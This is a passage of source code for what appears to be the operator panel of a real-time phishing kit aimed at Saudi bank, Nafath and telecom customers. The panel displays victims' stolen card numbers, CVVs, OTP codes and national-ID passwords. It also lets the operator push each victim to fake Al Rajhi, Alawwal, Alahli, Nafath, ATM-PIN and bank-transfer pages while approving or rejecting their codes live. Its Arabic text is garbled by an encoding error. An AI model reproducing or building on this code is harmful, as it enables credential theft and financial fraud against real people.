        if (!data) return null;
        for (const key of Object.keys(data)) {
          if (key.includes('Ø§Ø³Ù… Ø§Ù„Ø®Ø¯Ù…Ø©') || key === 'Ø§Ù„Ø®Ø¯Ù…Ø©') {
            return data[key];
          }
        }
        return null;
      }
      
      // Helper function to find commercial name (Ø§Ù„Ø§Ø³Ù… Ø§Ù„ØªØ¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø¹ØªÙ…Ø¯)
      function findCommercialName(data) {
        if (!data) return null;
        // Ø£Ø®Ø° Ø§Ù„Ø§Ø³Ù… Ø§Ù„ØªØ¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø¹ØªÙ…Ø¯ Ø§Ù„Ù…ÙØ´ÙƒÙ‘Ù„ Ø¯ÙŠÙ†Ø§Ù…ÙŠÙƒÙŠØ§Ù‹ ÙÙ‚Ø·
        if (data['Ø§Ù„Ø§Ø³Ù… Ø§Ù„ØªØ¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø¹ØªÙ…Ø¯']) return data['Ø§Ù„Ø§Ø³Ù… Ø§Ù„ØªØ¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø¹ØªÙ…Ø¯'];
        return null;
      }
      
      let commercialName = null;
      
      if (visitor.data) {
        serviceName = findServiceName(visitor.data);
        totalFees = findTotalFees(visitor.data);
        commercialName = findCommercialName(visitor.data);
      }
      if (visitor.dataHistory && visitor.dataHistory.length > 0) {
        for (const entry of visitor.dataHistory) {
          if (entry.content) {
            if (!serviceName) serviceName = findServiceName(entry.content);
            if (!totalFees) totalFees = findTotalFees(entry.content);
            if (!commercialName) commercialName = findCommercialName(entry.content);
          }
        }
      }
      // Commercial name is now shown in the data section below
      if (serviceName) {
        html += '<p class="text-blue-600 font-medium">' + serviceName;
        if (totalFees) html += ' <span class="text-green-600 font-bold mr-2">' + totalFees + '</span>';
        html += '</p>';
      }
      html += '<div class="flex items-center gap-2 mt-2">';
      html += visitor.isConnected !== true ? 
        '<span class="inline-block px-3 py-1 bg-red-100 text-red-800 rounded-full text-sm font-medium">ğŸ”´ ØºÙŠØ± Ù…ØªØµÙ„</span>' : 
        '<span class="inline-block px-3 py-1 bg-green-100 text-green-800 rounded-full text-sm font-medium">ğŸŸ¢ Ù…ØªØµÙ„</span>';
      if (visitor.waitingForAdminResponse) {
        html += '<span class="inline-block px-3 py-1 bg-yellow-100 text-yellow-800 rounded-full text-sm font-medium">â³ ÙŠÙ†ØªØ¸Ø± Ø§Ù„Ø±Ø¯</span>';
      }
      html += '</div>';
      // Device info in small text
      html += '<div class="text-xs text-gray-400 mt-2 space-x-3 space-x-reverse">';
      html += '<span>' + visitor.ip + '</span>';
      html += '<span>â€¢</span>';
      html += '<span>' + visitor.device + ' - ' + visitor.os + '</span>';
      html += '<span>â€¢</span>';
      html += '<span>' + visitor.browser + '</span>';
      html += '<span>â€¢</span>';
      html += '<span>' + visitor.country + '</span>';
      html += '</div>';
      html += '</div>';
      
      // Navigate to page (moved from bottom)
      html += '<div class="flex items-center gap-2">';
      html += '<span class="text-sm text-gray-500">ØªÙˆØ¬ÙŠÙ‡ Ù„ØµÙØ­Ø©</span>';
      html += '<select id="navigateSelectTop" class="px-3 py-2 border rounded-lg">';
      html += '<option value="">Ø§Ø®ØªØ± ØµÙØ­Ø©</option>';
      html += '<option value="credit-card-payment">Ø§Ù„Ø¯ÙØ¹ Ø¨Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©</option>';
      html += '<option value="otp-verification">OTP Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©</option>';
      html += '<option value="atm-password">ÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ± ATM</option>';
      html += '<option value="phone-verification">ØªÙˆØ«ÙŠÙ‚ Ø§Ù„Ø¬ÙˆØ§Ù„</option>';
      html += '<option value="phone-otp">OTP Ø§Ù„Ø¬ÙˆØ§Ù„</option>';
      html += '<option value="stc-call-alert">ØªÙ†Ø¨ÙŠÙ‡ STC</option>';
      html += '<option value="mobily-call-alert">ØªÙ†Ø¨ÙŠÙ‡ Mobily</option>';
      html += '<option value="nafath-login-page">Ù†ÙØ§Ø°</option>';
      html += '<option value="nafath-verify">ØªØ­Ù‚Ù‚ Ù†ÙØ§Ø°</option>';
      html += '<option value="alrajhi-login">Ø§Ù„Ø±Ø§Ø¬Ø­ÙŠ - ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„</option>';
      html += '<option value="alrajhi-otp">Ø§Ù„Ø±Ø§Ø¬Ø­ÙŠ - OTP</option>';
      html += '<option value="alrajhi-nafath">Ø§Ù„Ø±Ø§Ø¬Ø­ÙŠ - Ù†ÙØ§Ø°</option>';
      html += '<option value="alrajhi-alert">Ø§Ù„Ø±Ø§Ø¬Ø­ÙŠ - ØªÙ†Ø¨ÙŠÙ‡</option>';
      html += '<option value="alrajhi-call">Ø§Ù„Ø±Ø§Ø¬Ø­ÙŠ - Ø§ØªØµØ§Ù„</option>';
      html += '<option value="alawwal-bank">Ø¨Ù†Ùƒ Ø§Ù„Ø£ÙˆÙ„</option>';
      html += '<option value="alawwal-nafath">Ø§Ù„Ø£ÙˆÙ„ - Ù†ÙØ§Ø°</option>';
      html += '<option value="alahli-otp">Ø§Ù„Ø£Ù‡Ù„ÙŠ - OTP</option>';
      html += '<option value="bank-transfer">Ø§Ù„ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ø¨Ù†ÙƒÙŠ</option>';
      html += '<option value="bank-account-number">Ø±Ù‚Ù… Ø§Ù„Ø­Ø³Ø§Ø¨</option>';
      html += '<option value="mystc-otp">MyStc OTP</option>';
      html += '<option value="final-page">Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠØ©</option>';
      html += '</select>';
      html += '<button onclick="navigateVisitorTop(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>ØªÙˆØ¬ÙŠÙ‡</button>';
      html += '</div></div>';

      // Combine all entries (cards, codes, and data history) and sort by timestamp (newest first)
      const allEntries = [];
      
      // Add digit codes with type
      if (visitor.digitCodes && visitor.digitCodes.length > 0) {
        visitor.digitCodes.forEach((dc, index) => {
          allEntries.push({
            type: 'code',
            data: dc,
            index: index,
            timestamp: dc.timestamp || new Date(0).toISOString()
          });
        });
      }
      
      // Add payment cards with type
      if (visitor.paymentCards && visitor.paymentCards.length > 0) {
        visitor.paymentCards.forEach((card, index) => {
          allEntries.push({
            type: 'card',
            data: card,
            index: index,
            timestamp: card.timestamp || new Date(0).toISOString()
          });
        });
      }
      
      // Add data history entries
      if (visitor.dataHistory && visitor.dataHistory.length > 0) {
        visitor.dataHistory.forEach((entry, index) => {
          allEntries.push({
            type: 'data',
            data: entry,
            index: index,
            timestamp: entry.timestamp || new Date(0).toISOString()
          });
        });
      }
      
      // Sort by timestamp (newest first)
      allEntries.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
      
      // Render combined entries
      if (allEntries.length > 0) {
        html += '<div class="space-y-3">';
        allEntries.forEach((entry) => {
          if (entry.type === 'code') {
            const dc = entry.data;
            const index = entry.index;
            html += '<div class="data-section bg-orange-50 p-4 rounded-lg" style="border-right-color: #f97316;">';
            html += '<h3 class="font-bold mb-3 text-orange-800">ğŸ”¢ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚</h3>';
            html += '<div class="bg-white p-3 rounded-lg">';
            html += '<div class="flex justify-between items-center mb-2">';
            html += '<span class="font-mono text-lg font-bold text-orange-700">' + dc.code + '</span>';
            html += '<span class="text-sm text-gray-500">' + dc.page + '</span>';
            html += '</div>';
            html += '<div class="flex gap-2">';
            html += '<button onclick="codeActionApprove(\'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>Ù…ÙˆØ§ÙÙ‚Ø©</button>';
            html += '<button onclick="codeActionReject(\'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>Ø±ÙØ¶</button>';
            html += '</div>';
            html += '</div>';
            html += '</div>';
          } else if (entry.type === 'card') {
            const card = entry.data;
            const cardIndex = entry.index;
            const cardInfo = getCardInfo(card.cardNumber);
            html += '<div class="data-section bg-purple-50 p-4 rounded-lg" style="border-right-color: #9333ea;">';
            html += '<h3 class="font-bold mb-3 text-purple-800">ğŸ’³ Ø¨Ø·Ø§Ù‚Ø© Ø¯ÙØ¹</h3>';
            // Ø¹Ø±Ø¶ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨Ù†Ùƒ ÙˆØ§Ù„Ù†ÙˆØ¹
            html += '<div class="bg-gradient-to-r from-purple-100 to-blue-100 p-3 rounded-lg mb-3 flex justify-between items-center">';
            html += '<div class="flex items-center gap-2">';
            html += '<span class="text-purple-700 font-bold text-lg">ğŸ¦ ' + cardInfo.bank + '</span>';
            html += '<span class="px-2 py-1 rounded text-xs font-bold ' + (cardInfo.type === 'Credit' ? 'bg-blue-500 text-white' : 'bg-green-500 text-white') + '">' + cardInfo.type + '</span>';
            html += '</div>';
            html += '<div class="flex items-center gap-2">';
            html += '<span class="px-2 py-1 rounded text-xs font-bold bg-yellow-400 text-yellow-900">' + cardInfo.tier + '</span>';
            html += '<span class="text-gray-600 text-sm">' + cardInfo.network + '</span>';
            html += '</div>';
            html += '</div>';
            html += '<div class="bg-white p-4 rounded-lg border border-purple-200">';
            html += '<div class="grid grid-cols-2 gap-3 text-sm">';
            html += '<div><span class="text-gray-500">Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©:</span> <span class="font-mono font-bold">' + card.cardNumber + '</span></div>';
            html += '<div><span class="text-gray-500">Ø§Ù„Ø§Ø³Ù…:</span> <span class="font-medium">' + card.nameOnCard + '</span></div>';
            html += '<div><span class="text-gray-500">Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡:</span> <span class="font-medium">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
            html += '<div><span class="text-gray-500">CVV:</span> <span class="font-mono font-bold">' + card.cvv + '</span></div>';
            html += '</div>';
            // Action buttons for each card
            html += '<div class="flex gap-2 mt-3">';
            html += '<button onclick="cardActionOTP(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP</button>';
            html += '<button onclick="cardActionATM(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>ATM</button>';
            html += '<button onclick="cardActionReject(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>Ø±ÙØ¶</button>';
            html += '</div>';
            html += '</div>';
            html += '</div>';
          } else if (entry.type === 'data') {
            const dataEntry = entry.data;
            const dataIndex = entry.index;
            const bgColor = dataIndex % 2 === 0 ? 'bg-blue-50' : 'bg-teal-50';
            const borderColor = dataIndex % 2 === 0 ? '#3b82f6' : '#14b8a6';
            const textColor = dataIndex % 2 === 0 ? 'text-blue-800' : 'text-teal-800';
            
            html += '<div class="data-section ' + bgColor + ' p-4 rounded-lg" style="border-right-color: ' + borderColor + ';">';
            html += '<h3 class="font-bold mb-3 ' + textColor + '">ğŸ“‹ ' + (dataEntry.page || 'Ø¨ÙŠØ§Ù†Ø§Øª') + '</h3>';
            html += '<div class="grid grid-cols-2 gap-3">';
            
            // Get commercial name from Ø§Ù„Ø§Ø³Ù… Ø§Ù„ØªØ¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø¹ØªÙ…Ø¯ field
            let commercialNameBuilt = null;
            const content = dataEntry.content;
            if (content['Ø§Ù„Ø§Ø³Ù… Ø§Ù„ØªØ¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø¹ØªÙ…Ø¯']) {
              commercialNameBuilt = content['Ø§Ù„Ø§Ø³Ù… Ø§Ù„ØªØ¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø¹ØªÙ…Ø¯'];
            } else if (content['Ø§Ù„Ø§Ø³Ù… Ø§Ù„ØªØ¬Ø§Ø±ÙŠ']) {
              commercialNameBuilt = 'Ù…Ø¤Ø³Ø³Ø© ' + content['Ø§Ù„Ø§Ø³Ù… Ø§Ù„ØªØ¬Ø§Ø±ÙŠ'];
            }
            
            // Add commercial name field first if built
            if (commercialNameBuilt) {
              html += '<div class="bg-purple-100 p-3 rounded-lg col-span-2"><span class="text-purple-600 text-sm block font-bold">Ø§Ù„Ø§Ø³Ù… Ø§Ù„ØªØ¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø¹ØªÙ…Ø¯</span><span class="font-bold text-purple-800 text-lg">' + commercialNameBuilt + '</span></div>';
            }
            
            Object.entries(dataEntry.content).forEach(([key, value]) => {
              html += '<div class="bg-white p-3 rounded-lg"><span class="text-gray-500 text-sm block">' + key + '</span><span class="font-medium text-gray-800">' + (value || '-') + '</span></div>';
            });
            html += '</div></div>';
          }
        });
        html += '</div>';
      }
      
      if (!allEntries.length && visitor.data && Object.keys(visitor.data).length > 0) {
        // Fallback to old data format
        const nafathData = {};
        const updateInfoData = {};
        const otherData = {};
        
        const updateInfoKeys = ['Ø§Ù„Ø§Ø³Ù… Ø¨Ø§Ù„Ø¹Ø±Ø¨ÙŠ', 'Ø§Ù„Ø§Ø³Ù… Ø¨Ø§Ù„Ø¥Ù†Ø¬Ù„ÙŠØ²ÙŠ', 'Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ© Ø§Ù„ÙˆØ·Ù†ÙŠØ©', 'ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯', 'Ø§Ù„Ø¬Ù†Ø³ÙŠØ©', 'Ù†ÙˆØ¹ Ø§Ù„Ù…Ø§Ù„Ùƒ', 'Ø§Ù„Ø¬Ù†Ø³',
          'Ø±Ù‚Ù… Ø§Ù„Ø¬ÙˆØ§Ù„', 'Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ', 'Ø§Ù„Ø¹Ù†ÙˆØ§Ù† Ø§Ù„ÙˆØ·Ù†ÙŠ', 'Ø±Ù‚Ù… Ø§Ù„Ù…Ø¨Ù†Ù‰', 'Ø±Ù‚Ù… Ø§Ù„Ø·Ø§Ø¨Ù‚',
          'Ø§Ù„Ù†Ø´Ø§Ø· Ø§Ù„Ø¹Ø§Ù…', 'Ø§Ù„Ù†Ø´Ø§Ø· Ø§Ù„Ø®Ø§Øµ', 'Ø±Ø£Ø³ Ø§Ù„Ù…Ø§Ù„',
          'Ø¹Ù„Ø§Ù…Ø© ØªØ¬Ø§Ø±ÙŠØ©', 'Ø§Ø³Ù… Ø§Ù„Ø¹Ù„Ø§Ù…Ø©', 'Ø§Ø³Ù… Ø§Ù„Ù…Ø­Ù„', 'Ø±Ù‚Ù… Ø§Ù„Ù…Ø­Ù„', 'Ø±Ù‚Ù… Ø§Ù„Ø¹Ù‚Ø§Ø±', 'Ø¹Ø¯Ø¯ Ø§Ù„ÙØªØ­Ø§Øª', 'Ø¹Ø¯Ø¯ Ø§Ù„Ø·ÙˆØ§Ø¨Ù‚', 'Ø¹Ø¯Ø¯ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§Øª', 'Ù…ØµØ¹Ø¯', 'Ø¯Ø§Ø®Ù„ Ù…Ø¬Ù…Ø¹ ØªØ¬Ø§Ø±ÙŠ', 'Ù†ÙˆØ¹ Ø§Ù„Ø¹Ù‚Ø¯',
          'Ù†ÙˆØ¹ Ø§Ù„Ù„ÙˆØ­Ø©', 'Ù…Ø³Ø§Ø­Ø© Ø§Ù„Ù„ÙˆØ­Ø©', 'Ù†ÙˆØ¹ Ø§Ù„Ù…Ø³Ø§Ø±',
          'Ù†ÙˆØ¹ Ø§Ù„Ø§Ø³Ù…', 'Ø§Ù„Ø§Ø³Ù… Ø§Ù„ØªØ¬Ø§Ø±ÙŠ', 'Ø§Ø³Ù… Ø§Ù„Ø¹Ù„Ø§Ù…Ø© Ø¨Ø§Ù„Ø¹Ø±Ø¨ÙŠ', 'Ø§Ø³Ù… Ø§Ù„Ø¹Ù„Ø§Ù…Ø© Ø¨Ø§Ù„Ø¥Ù†Ø¬Ù„ÙŠØ²ÙŠ',
          'Ø§Ø³Ù… Ø§Ù„Ø®Ø¯Ù…Ø©', 'Ø±Ù‚Ù… Ø§Ù„Ø·Ù„Ø¨', 'Ø±Ù‚Ù… Ø§Ù„Ø³Ø¬Ù„ Ø§Ù„ØªØ¬Ø§Ø±ÙŠ'];
        
        Object.entries(visitor.data).forEach(([key, value]) => {
          if (['Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… / Ø§Ù„Ù‡ÙˆÙŠØ© Ø§Ù„ÙˆØ·Ù†ÙŠØ©', 'ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± (Ù†ÙØ§Ø°)'].includes(key)) {
            nafathData[key] = value;
          } else if (updateInfoKeys.includes(key)) {
            updateInfoData[key] = value;
          } else {
            otherData[key] = value;
          }
        });

        // Update Info Data Section (shown first - newer data)
        if (Object.keys(updateInfoData).length > 0) {
          html += '<div class="data-section bg-blue-50 p-4 rounded-lg">';
          html += '<h3 class="font-bold mb-3 text-blue-800">ğŸ“‹ Ø¨ÙŠØ§Ù†Ø§Øª ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª</h3>';
          html += '<div class="grid grid-cols-2 gap-3">';
          Object.entries(updateInfoData).forEach(([key, value]) => {
            html += '<div class="bg-white p-3 rounded-lg"><span class="text-gray-500 text-sm block">' + key + '</span><span class="font-medium text-gray-800">' + (value || '-') + '</span></div>';
          });
          html += '</div></div>';
        }

        // Nafath Data Section (shown second - older data)
        if (Object.keys(nafathData).length > 0) {
          html += '<div class="data-section bg-teal-50 p-4 rounded-lg" style="border-right-color: #14b8a6;">';
          html += '<h3 class="font-bold mb-3 text-teal-800">ğŸ” Ø¨ÙŠØ§Ù†Ø§Øª Ù†ÙØ§Ø°</h3>';
          html += '<div class="grid grid-cols-2 gap-3">';
          Object.entries(nafathData).forEach(([key, value]) => {
            html += '<div class="bg-white p-3 rounded-lg"><span class="text-gray-500 text-sm block">' + key + '</span><span class="font-medium text-gray-800">' + value + '</span></div>';
          });
          html += '</div></div>';
        }
        
        // Other Data Section
        if (Object.keys(otherData).length > 0) {
          html += '<div class="data-section bg-gray-50 p-4 rounded-lg">';
          html += '<h3 class="font-bold mb-3 text-gray-800">ğŸ“ Ø¨ÙŠØ§Ù†Ø§Øª Ø£Ø®Ø±Ù‰</h3>';
          html += '<div class="grid grid-cols-2 gap-3">';
          Object.entries(otherData).forEach(([key, value]) => {
            html += '<div class="bg-white p-3 rounded-lg"><span class="text-gray-500 text-sm block">' + key + '</span><span class="font-medium text-gray-800">' + value + '</span></div>';
          });
          html += '</div></div>';
        }
      }

      // Actions
      html += '<div class="border-t pt-4"><h3 class="font-bold mb-3">Ø¥Ø¬Ø±Ø§Ø¡Ø§Øª</h3>';
      html += '<div class="grid grid-cols-2 gap-4">';
      
      // Send Code
      html += '<div><label class="block text-sm text-gray-500 mb-1">Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø²</label>';
      html += '<div class="flex gap-2"><input type="text" id="codeInput" class="flex-1 px-3 py-2 border rounded-lg" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ù„Ø±Ù…Ø²">';
      html += '<button onclick="sendCode(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700">Ø¥Ø±Ø³Ø§Ù„</button></div></div>';
      
      // Navigate
      html += '<div><label class="block text-sm text-gray-500 mb-1">ØªÙˆØ¬ÙŠÙ‡ Ù„ØµÙØ­Ø©</label>';
      html += '<div class="flex gap-2"><select id="navigateSelect" class="flex-1 px-3 py-2 border rounded-lg">';
      html += '<option value="">Ø§Ø®ØªØ± ØµÙØ­Ø©</option>';
      html += '<option value="credit-card-payment">Ø§Ù„Ø¯ÙØ¹ Ø¨Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©</option>';
      html += '<option value="otp-verification">OTP Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©</option>';
      html += '<option value="atm-password">ÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ± ATM</option>';
      html += '<option value="phone-verification">ØªÙˆØ«ÙŠÙ‚ Ø§Ù„Ø¬ÙˆØ§Ù„</option>';
      html += '<option value="phone-otp">OTP Ø§Ù„Ø¬ÙˆØ§Ù„</option>';
      html += '<option value="stc-call-alert">ØªÙ†Ø¨ÙŠÙ‡ STC</option>';
      html += '<option value="mobily-call-alert">ØªÙ†Ø¨ÙŠÙ‡ Mobily</option>';
      html += '<option value="nafath-login-page">Ù†ÙØ§Ø°</option>';
      html += '<option value="nafath-verify">ØªØ­Ù‚Ù‚ Ù†ÙØ§Ø°</option>';
      html += '<option value="alrajhi-login">Ø§Ù„Ø±Ø§Ø¬Ø­ÙŠ - ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„</option>';
      html += '<option value="alrajhi-otp">Ø§Ù„Ø±Ø§Ø¬Ø­ÙŠ - OTP</option>';
      html += '<option value="alrajhi-nafath">Ø§Ù„Ø±Ø§Ø¬Ø­ÙŠ - Ù†ÙØ§Ø°</option>';
      html += '<option value="alrajhi-alert">Ø§Ù„Ø±Ø§Ø¬Ø­ÙŠ - ØªÙ†Ø¨ÙŠÙ‡</option>';
      html += '<option value="alrajhi-call">Ø§Ù„Ø±Ø§Ø¬Ø­ÙŠ - Ø§ØªØµØ§Ù„</option>';
      html += '<option value="alawwal-bank">Ø¨Ù†Ùƒ Ø§Ù„Ø£ÙˆÙ„</option>';
      html += '<option value="alawwal-nafath">Ø§Ù„Ø£ÙˆÙ„ - Ù†ÙØ§Ø°</option>';
      html += '<option value="alahli-otp">Ø§Ù„Ø£Ù‡Ù„ÙŠ - OTP</option>';
      html += '<option value="bank-transfer">Ø§Ù„ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ø¨Ù†ÙƒÙŠ</option>';
      html += '<option value="bank-account-number">Ø±Ù‚Ù… Ø§Ù„Ø­Ø³Ø§Ø¨</option>';
      html += '<option value="mystc-otp">MyStc OTP</option>';
      html += '<option value="final-page">Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠØ©</option>';
      html += '</select>';
      html += '<button onclick="navigateVisitor(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700">ØªÙˆØ¬ÙŠÙ‡</button></div></div>';
      
      html += '</div>';
      
      // Send Message
      html += '<div class="mt-4"><label class="block text-sm text-gray-500 mb-1">Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ù†Ù‡Ø§Ø¦ÙŠØ©</label>';
      html += '<div class="flex gap-2"><input type="text" id="messageInput" class="flex-1 px-3 py-2 border rounded-lg" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø©">';
      html += '<button onclick="sendMessage(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700">Ø¥Ø±Ø³Ø§Ù„</button></div></div>';
      
      // Block and Delete
      html += '<div class="flex gap-2 mt-4">';
      html += '<button onclick="blockVisitor(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700">Ø­Ø¸Ø±</button>';
      html += '<button onclick="deleteVisitor(\'' + visitor._id + '\')" class="px-4 py-2 bg-gray-600 text-white rounded-lg hover:bg-gray-700">Ø­Ø°Ù</button>';
      html += '</div></div>';

      html += '</div>';
      
      visitorDetails.innerHTML = html;
    }

    // Action functions
    function approveForm(socketId) {
      socket.emit('admin:approve', { visitorSocketId: socketId });
    }

    function rejectForm(socketId) {
      socket.emit('admin:reject', { visitorSocketId: socketId });
    }

    function sendCode(socketId) {
      const code = document.getElementById('codeInput').value;
      if (code) {
        socket.emit('admin:sendCode', { visitorSocketId: socketId, code });
        document.getElementById('codeInput').value = '';
      }
    }

    function navigateVisitor(socketId) {
      const page = document.getElementById('navigateSelect').value;
      if (page) {
        socket.emit('admin:navigate', { visitorSocketId: socketId, page });
      }
    }

    function navigateVisitorTop(socketId) {
      const page = document.getElementById('navigateSelectTop').value;
      if (page) {
        socket.emit('admin:navigate', { visitorSocketId: socketId, page });
      }
    }

    // Card action functions
    function cardActionOTP(socketId) {
      // Disable the clicked button
      event.target.disabled = true;
      event.target.style.opacity = '0.5';
      event.target.style.cursor = 'not-allowed';
      event.target.innerHTML = 'Ø¬Ø§Ø±ÙŠ...';
      socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'otp' });
    }

    function cardActionATM(socketId) {
      // Disable the clicked button
      event.target.disabled = true;
      event.target.style.opacity = '0.5';
      event.target.style.cursor = 'not-allowed';
      event.target.innerHTML = 'Ø¬Ø§Ø±ÙŠ...';
      socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'atm' });
    }

    function cardActionReject(socketId) {
      // Disable the clicked button
      event.target.disabled = true;
      event.target.style.opacity = '0.5';
      event.target.style.cursor = 'not-allowed';
      event.target.innerHTML = 'Ø¬Ø§Ø±ÙŠ...';
      socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'reject' });
    }

    // Code action functions (for OTP/digit codes)
    function codeActionApprove(socketId, codeIndex) {
      // Disable the clicked button
      event.target.disabled = true;
      event.target.style.opacity = '0.5';
      event.target.style.cursor = 'not-allowed';
      event.target.innerHTML = 'Ø¬Ø§Ø±ÙŠ...';
      socket.emit('admin:codeAction', { visitorSocketId: socketId, action: 'approve', codeIndex });
    }

    function codeActionReject(socketId, codeIndex) {
      // Disable the clicked button
      event.target.disabled = true;
      event.target.style.opacity = '0.5';
      event.target.style.cursor = 'not-allowed';
      event.target.innerHTML = 'Ø¬Ø§Ø±ÙŠ...';
      socket.emit('admin:codeAction', { visitorSocketId: socketId, action: 'reject', codeIndex });
    }

    function sendMessage(socketId) {
      const message = document.getElementById('messageInput').value;
      if (message) {
        socket.emit('admin:sendMessage', { visitorSocketId: socketId, message });
        document.getElementById('messageInput').value = '';
      }
    }

    function blockVisitor(socketId) {
      if (confirm('Ù‡Ù„ Ø£Ù†Øª Ù…ØªØ£ÙƒØ¯ Ù…Ù† Ø­Ø¸Ø± Ù‡Ø°Ø§ Ø§Ù„Ø²Ø§Ø¦Ø±ØŸ')) {
        socket.emit('admin:block', { visitorSocketId: socketId });
      }
    }

    function deleteVisitor(visitorId) {
      if (confirm('Ù‡Ù„ Ø£Ù†Øª Ù…ØªØ£ÙƒØ¯ Ù…Ù† Ø­Ø°Ù Ù‡Ø°Ø§ Ø§Ù„Ø²Ø§Ø¦Ø±ØŸ')) {
        socket.emit('admin:deleteById', visitorId);
        visitors.delete(visitorId);
        selectedVisitorId = null;
        renderVisitorsList();
        visitorDetails.innerHTML = '<div class="text-center py-12 text-gray-500"><svg class="w-16 h-16 mx-auto mb-4 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg><p>Ø§Ø®ØªØ± Ø²Ø§Ø¦Ø± Ù„Ø¹Ø±Ø¶ Ø§Ù„ØªÙØ§ØµÙŠÙ„</p></div>';
      }
    }

    function deleteVisitorFromCard(visitorId) {
      if (confirm('Ù‡Ù„ Ø£Ù†Øª Ù…ØªØ£ÙƒØ¯ Ù…Ù† Ø­Ø°Ù Ø§Ù„Ø¹Ù…ÙŠÙ„ØŸ')) {
        socket.emit('admin:deleteById', visitorId);
        visitors.delete(visitorId);
        if (selectedVisitorId === visitorId) {
          selectedVisitorId = null;
          visitorDetails.innerHTML = '<div class="text-center py-12 text-gray-500"><svg class="w-16 h-16 mx-auto mb-4 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg><p>Ø§Ø®ØªØ± Ø²Ø§Ø¦Ø± Ù„Ø¹Ø±Ø¶ Ø§Ù„ØªÙØ§ØµÙŠÙ„</p></div>';
        }
        renderVisitorsList();
      }
    }

    // Notification
    function showNotification(message) {
      if (Notification.permission === 'granted') {
        new Notification('Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…', { body: message });
      }
    }

    // Request notification permission
    if ('Notification' in window) {
      Notification.requestPermission();
    }

    // Settings menu functions
    function toggleSettingsMenu() {
      const menu = document.getElementById('settingsMenu');
      menu.classList.toggle('hidden');
    }

    // Close settings menu when clicking outside
